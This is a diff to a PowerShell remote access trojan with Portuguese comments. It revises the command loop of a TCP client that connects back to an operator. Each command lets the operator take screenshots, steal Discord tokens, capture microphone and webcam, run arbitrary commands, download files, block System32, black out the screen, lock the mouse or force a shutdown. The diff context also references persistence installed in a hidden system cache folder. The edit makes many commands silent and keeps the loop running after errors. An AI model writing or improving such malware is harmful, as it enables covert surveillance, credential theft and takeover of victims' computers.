@@ -395,7 +395,7 @@ if (-not (Test-Path "$env:ProgramData\Microsoft\Windows\Caches\$installName.ps1"
     Install-Persistence
 }
 
-# ===== CONEXAO PRINCIPAL (CORRIGIDA) =====
+# ===== CONEXAO PRINCIPAL (CORRIGIDA - SEM ESPERAR RESPOSTA) =====
 while ($true) {
     try {
         $client = New-Object System.Net.Sockets.TcpClient
@@ -414,38 +414,47 @@ while ($true) {
         
         while ($client.Connected) {
             try {
-                $cmd = $reader.ReadLine()
-                if ([string]::IsNullOrEmpty($cmd)) { 
+                # Verifica se há dados disponíveis antes de ler
+                if ($stream.DataAvailable) {
+                    $cmd = $reader.ReadLine()
+                } else {
                     Start-Sleep -Milliseconds 100
-                    continue 
+                    continue
                 }
                 
+                if ([string]::IsNullOrEmpty($cmd)) { continue }
+                
                 switch ($cmd) {
+                    # Comandos que retornam resposta
                     "screenshot" { $writer.WriteLine((Get-ScreenCapture)) }
-                    "click" { $writer.WriteLine((Click-Mouse)) }
-                    "rightclick" { $writer.WriteLine((RightClick-Mouse)) }
                     "discord" { $writer.WriteLine((Get-DiscordToken)) }
-                    "block_system32" { $writer.WriteLine((Block-System32)) }
-                    "black_screen" { $writer.WriteLine((Black-Screen)) }
-                    "unlock_screen" { $writer.WriteLine((Unlock-Screen)) }
-                    "lock_mouse" { $writer.WriteLine((Lock-Mouse)) }
-                    "unlock_mouse" { $writer.WriteLine((Unlock-Mouse)) }
-                    "mic" { $writer.WriteLine((Get-Microphone)) }
-                    "webcam" { $writer.WriteLine((Get-Webcam)) }
-                    "processes" { $writer.WriteLine((Get-ProcessList)) }
-                    "shutdown" { $writer.WriteLine((Power-Control "shutdown")) }
-                    "reboot" { $writer.WriteLine((Power-Control "reboot")) }
                     "list_users" { $writer.WriteLine((Get-RATUsers)) }
-                    "remove_current_user" { $writer.WriteLine((Remove-UserFromRAT $currentUser)) }
+                    "processes" { $writer.WriteLine((Get-ProcessList)) }
                     "test" { $writer.WriteLine("PONG") }
-                    "exit" { break }
+                    
+                    # Comandos que NÃO retornam resposta (só executam)
+                    "lock_mouse" { Lock-Mouse | Out-Null }
+                    "unlock_mouse" { Unlock-Mouse | Out-Null }
+                    "black_screen" { $null = Black-Screen }
+                    "unlock_screen" { $null = Unlock-Screen }
+                    "block_system32" { $null = Block-System32 }
+                    "shutdown" { $null = Power-Control "shutdown" }
+                    "reboot" { $null = Power-Control "reboot" }
+                    "mic" { $null = Get-Microphone }
+                    "webcam" { $null = Get-Webcam }
+                    
+                    # Comandos com parâmetros
                     default {
                         if ($cmd -match "^move (.+) (.+)$") {
-                            $writer.WriteLine((Move-Mouse $matches[1] $matches[2]))
+                            Move-Mouse $matches[1] $matches[2] | Out-Null
+                        } elseif ($cmd -match "^click$") {
+                            Click-Mouse | Out-Null
+                        } elseif ($cmd -match "^rightclick$") {
+                            RightClick-Mouse | Out-Null
                         } elseif ($cmd -match "^key (.+)$") {
-                            $writer.WriteLine((Send-Key $matches[1]))
+                            Send-Key $matches[1] | Out-Null
                         } elseif ($cmd -match "^type (.+)$") {
-                            $writer.WriteLine((Send-Text $matches[1]))
+                            Send-Text $matches[1] | Out-Null
                         } elseif ($cmd -match "^ls (.+)$") {
                             $writer.WriteLine((Get-FileList $matches[1]))
                         } elseif ($cmd -match "^download (.+)$") {
@@ -453,21 +462,25 @@ while ($true) {
                         } elseif ($cmd -match "^exec (.+)$") {
                             $writer.WriteLine((Execute-Command $matches[1]))
                         } elseif ($cmd -match "^url (.+)$") {
-                            $writer.WriteLine((Open-Url $matches[1]))
+                            Open-Url $matches[1] | Out-Null
                         } elseif ($cmd -match "^remove_user (.+)$") {
                             $writer.WriteLine((Remove-UserFromRAT $matches[1]))
-                        } else {
-                            $writer.WriteLine("Comando nao reconhecido")
+                        } elseif ($cmd -match "^remove_current_user$") {
+                            $writer.WriteLine((Remove-UserFromRAT $currentUser))
                         }
                     }
                 }
+                
+                # Pequena pausa para não sobrecarregar
+                Start-Sleep -Milliseconds 10
+                
             } catch {
-                # Se der erro na leitura/escrita, sai do loop interno
-                break
+                # Se der erro, tenta continuar
+                continue
             }
         }
     } catch {
-        # Silenciosamente ignora erros de conexão
+        # Ignora erros de conexão
     } finally {
         if ($client) { $client.Close() }
         Start-Sleep -Seconds 5
